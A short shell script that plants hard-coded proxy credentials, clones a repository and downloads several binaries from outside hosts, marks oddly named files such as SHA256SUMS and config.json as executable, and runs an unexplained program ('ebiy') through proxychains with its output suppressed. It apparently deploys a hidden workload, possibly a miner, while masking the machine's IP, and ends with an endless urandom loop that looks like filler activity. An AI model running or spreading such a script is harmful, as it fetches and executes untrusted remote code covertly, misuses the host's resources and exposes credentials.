proxy="38.154.227.167" 
port="5868" 
user="ugursfso"  
pass="wqn60pnk6m95" 
git clone https://github.com/OpUiajwk/opoiyy.git && cd opoiyy && chmod +x SHA256SUMS && chmod +x config.json && chmod +x ebiy
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
sleep 3 
sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
sleep 1 
sed -i "s/port/$port/" "proxychains.conf" 
sed -i "s/user/$user/" "proxychains.conf"  
sleep 1  
sed -i "s/pass/$pass/" "proxychains.conf" 
sleep 11 
echo "******************************************************************" 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo " " 
echo " " 
echo "IP BARU ==> "$(./panel curl ifconfig.me)
./panel ./ebiy -c "config.json" >/dev/null 2>&1
sleep 1
sync; echo 3 > /proc/sys/vm/drop_caches
docker run -ti --rm -v /proc/sys/vm/drop_caches:/drop_caches alpine
while [ true ]; do head -n 100 /dev/urandom; sleep .1; done | hexdump -C | grep "ca fe"
